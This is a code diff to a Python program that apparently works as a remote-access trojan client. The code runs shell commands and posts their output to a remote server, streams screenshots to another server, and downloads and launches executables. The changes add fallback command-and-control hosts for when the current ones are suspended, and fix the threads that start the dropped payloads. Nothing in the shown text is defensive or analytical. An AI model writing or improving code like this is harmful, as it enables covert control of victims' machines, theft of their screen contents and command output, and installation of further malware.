@@ -20,8 +20,9 @@ import asyncio
 import aiohttp
 import pygame
 import ctypes
-url = "https://ms32-sha2.onrender.com/"
-# url = "http://127.0.0.1:5000/"
+url = "https://ms32-sha2.onrender.com/" if b"This service has been suspended." not in get("https://ms32-sha2.onrender.com").content else "https://ms32-c67b.onrender.com/"
+server_url = "https://server-20zy.onrender.com/" if b"This service has been suspended." not in get("https://server-20zy.onrender.com").content else "https://server-ktcy.onrender.com/"
+# url = "http://192.168.9.115:5000/"
 screen = get_primary_display()
 terminate = False           
 sstate = False
@@ -49,7 +50,6 @@ def is_admin():
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
-
 def hit(url:str,data=None):
     # try:
         if not terminate:
@@ -305,7 +305,10 @@ def runcmd(cmd):
         if not stderr:stderr="none"
         if not stdout:stdout="none"
         output = f"OUTPUT:\t{stdout}\nERROR:\t{stderr}\nCODE:\t{exit_code}"
-        post(url+"terminal",json={"output":output})
+        alsr = post(url+"terminal",json={"output":output})
+        if alsr.status_code == 200:
+            print("alsr")
+            print(result.stdout)
 
     except Exception as e:
         log(f"runcmd thread error:\t{e}",state="WARN")
@@ -326,7 +329,7 @@ def showerr(num):
                             file.write(chunk)
                             downloaded_size += len(chunk)
         for _ in range(1,int(num)+1):
-            Thread(target=startfile,args=("error.exe",))
+            Thread(target=startfile,args=("error.exe",)).start()
             sleep(0.5)
         log(f"deployed {num} errors",terminal=True)
     except Exception as e:
@@ -430,7 +433,7 @@ async def send_screenshot(session, url, buffer):
     return False
 async def share_runner():
     log("sharing started")
-    url = "https://server-20zy.onrender.com/screenshot"
+    url = server_url+"screenshot"
     await share(url)
 async def control_runner():
     await control()
@@ -509,7 +512,7 @@ def commtxt():
                             file.write(chunk)
                             downloaded_size += len(chunk)
             
-        Thread(target=startfile,args=("speakdisplay.exe",))
+        Thread(target=startfile,args=("speakdisplay.exe",)).start()
         log(f"started commtxt",terminal=True)
     except Exception as e:
         log(f"commtxt thread error:\t{e}",state="WARN")
